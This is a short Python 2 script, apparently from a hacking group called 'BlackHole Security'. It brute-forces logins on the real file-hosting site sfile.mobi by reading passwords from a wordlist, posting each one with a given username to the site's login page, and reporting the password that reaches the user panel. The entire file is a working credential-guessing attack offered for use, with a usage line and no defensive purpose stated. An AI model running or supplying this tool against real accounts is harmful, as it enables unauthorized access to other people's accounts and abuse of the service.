## sfilebf.py - SFile Brute Force
# -*- coding: utf-8 -*-
##
import sys
import requests
import threading

__date__ = "14-July-2018"
__author__ = "DedSecTL/DTL"
__team__ = "BlackHole Security"
__codename__ = "SFile, OK."
__banner__ = """
################################################
#              SFile Brute Force               #
#              BlackHole Security              #
#               14 - July - 2018               #
################################################
"""

def sfilebf(username, wordlist):
	for passwd in open(wordlist, 'r').read().split():
		params = {"mail":username, "pass":passwd, "LogIn":"Login"}
		r = requests.post("https://sfile.mobi/login.php", data=params)
		if "User Panel" in r.text:
			print "[+] Password:",passwd,"is correct"
			print "\n[+] You are successfully logged in!"
			break
		else:
			print "[-] Password:",passwd,"is incorrect"
			pass

if __name__ == '__main__':
	print __banner__
	if len(sys.argv) != 3:
		print "Usage: sfilebf username wordlist.txt"
	else:
		t = threading.Thread(target=sfilebf, args=(sys.argv[1], sys.argv[2]))
		t.start()